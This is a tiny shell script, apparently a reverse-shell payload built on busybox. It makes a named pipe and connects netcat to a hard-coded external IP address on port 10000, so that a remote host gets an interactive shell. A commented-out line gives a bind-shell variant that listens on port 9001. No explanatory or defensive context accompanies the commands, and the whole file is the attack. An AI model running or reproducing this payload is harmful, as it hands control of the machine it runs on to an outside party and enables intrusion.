#./busybox sh

./busybox mkfifo backpipe
./busybox nc 138.197.136.154 10000 < backpipe | ./busybox sh &> backpipe

#./busybox nc -l -p 9001 -e ./busyb
# ox sh
